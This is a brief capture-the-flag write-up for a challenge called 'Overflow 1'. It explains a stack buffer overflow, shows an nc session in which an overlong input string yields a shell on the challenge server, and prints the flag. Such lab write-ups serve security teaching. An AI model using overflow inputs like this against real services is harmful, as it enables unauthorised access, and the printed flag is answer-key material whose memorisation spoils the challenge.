# Overflow 1

Looking at the source, we see a character buffer of 16, and 4 As in char[str]. Below this, we see a check that if there are 4 As inputted at the start of your payload, something interesting happens. No solve script needed, just common sense.

```
$ nc cyberyoddha.baycyber.net 10001  
AAAAaaaaaaaaaaaaaaaaaaaaaaaa
ls
flag.txt
overflow1
cat flag.txt
CYCTF{st@ck_0v3rfl0ws_@r3_3z}
```

#### Flag: CYCTF{st@ck_0v3rfl0ws_@r3_3z}
